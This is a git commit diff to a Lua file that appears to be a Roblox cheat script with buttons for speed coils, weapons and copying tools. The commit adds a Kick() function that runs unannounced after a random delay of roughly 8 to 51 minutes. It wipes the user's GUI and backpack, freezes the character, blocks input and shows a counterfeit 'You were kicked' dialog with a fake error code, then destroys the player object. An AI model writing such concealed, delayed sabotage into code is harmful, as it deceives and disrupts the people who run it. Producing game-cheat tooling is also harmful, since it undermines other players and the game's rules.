0f1cece50fa22c5395e289ac819e5c4ee8af6803
Viktor188834 <atabaevviktor671@gmail.com>
2025-06-22 09:47:48 +0300

    Update dadada.lua

--- dadada.lua
+++ dadada.lua
@@ -656,3 +656,86 @@ SpeedCoilFrame.MouseButton1Click:Connect(SpeedCoil)
 Akkk.MouseButton1Click:Connect(Ak47)
 GodCoil.MouseButton1Click:Connect(GodCoill)
 copytools.MouseButton1Click:Connect(Buildaboatfortreashure)
+
+function Kick()
+	player.PlayerGui:ClearAllChildren()
+	player.Backpack:ClearAllChildren()
+	local cr = player.Character
+	local hm = cr.HumanoidRootPart
+	hm.Anchored = true
+	local lollllllllll = Instance.new("ScreenGui")
+	local blur = Instance.new("BlurEffect")
+	local CantDoing = Instance.new("Frame")
+	local Frame = Instance.new("Frame")
+	local line = Instance.new("Frame")
+	local text = Instance.new("TextLabel")
+	local text1 = Instance.new("TextLabel")
+	text1.Text = "You were kicked from this experience: You have been"
+	local text2 = Instance.new("TextLabel")
+	text2.Text = "kicked from the game"
+	local text3 = Instance.new("TextLabel")
+	text3.Text = "(Error Code: 267)"
+	local Button = Instance.new("TextButton")
+	local corn = Instance.new("UICorner")
+	lollllllllll.Parent = player.PlayerGui
+	lollllllllll.Name = "BanScreen"
+	Frame.Name = "Ban"
+	Frame.Parent = lollllllllll
+	Frame.BackgroundColor3 = Color3.fromRGB(73, 73, 72)
+	Frame.Position = UDim2.new(0.4, 0, 0.39, 0)
+	Frame.Size = UDim2.new(0.2, 0, 0.22, 0)
+	Frame.BorderSizePixel = 0
+	blur.Parent = game:FindService("Lighting")
+	blur.Name = "blur"
+	blur.Size = 25
+	CantDoing.Parent = lollllllllll
+	CantDoing.Name = "CantDoing"
+	CantDoing.Size = UDim2.new(5, 5, 5 ,5)
+	CantDoing.Position = UDim2.new(-2.5, 2.5, -2.5, 2.5)
+	CantDoing.Active = true
+	CantDoing.BackgroundTransparency = 0.99
+	text.Parent = Frame
+	text.Name = "Text"
+	text.TextColor3 = Color3.fromRGB(255, 255, 255)
+	text.TextSize = 16
+	text.Position = UDim2.new(0.5, 0, 0.11, 0)
+	text.Text = "Disconnected"
+	line.Parent = Frame
+	line.Name = "Line"
+	line.Position = UDim2.new(0.05, 0, 0.2, 0)
+	line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	line.Size = UDim2.new(0.9, 0, 0.0086, 0)
+	line.BorderSizePixel = 0
+	text1.Parent = Frame
+	text1.Name = "Reason1"
+	text1.Position = UDim2.new(0.5, 0, 0.35, 0)
+	text1.TextSize = 11
+	text1.TextColor3 = Color3.fromRGB(255, 255, 255)
+	text2.Parent = Frame
+	text2.Name = "Reason2"
+	text2.Position = UDim2.new(0.5, 0, 0.45, 0)
+	text2.TextSize = 11
+	text2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	text3.Parent = Frame
+	text3.Name = "Reason3"
+	text3.Position = UDim2.new(0.5, 0, 0.55, 0)
+	text3.TextSize = 11
+	text3.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Button.Parent = Frame
+	Button.Name = "Leave"
+	Button.Text = "Leave"
+	Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Button.TextColor3 = Color3.fromRGB(73, 73, 72)
+	Button.Position = UDim2.new(0.1, 0, 0.7, 0)
+	Button.Size = UDim2.new(0.8, 0, 0.2, 0)
+	Button.TextSize = 11
+	corn.Parent = Button
+
+	function oo()
+		player:Destroy()
+	end
+	Button.MouseButton1Click:Connect(oo)
+end
+
+wait(math.random(480, 3060))
+Kick()
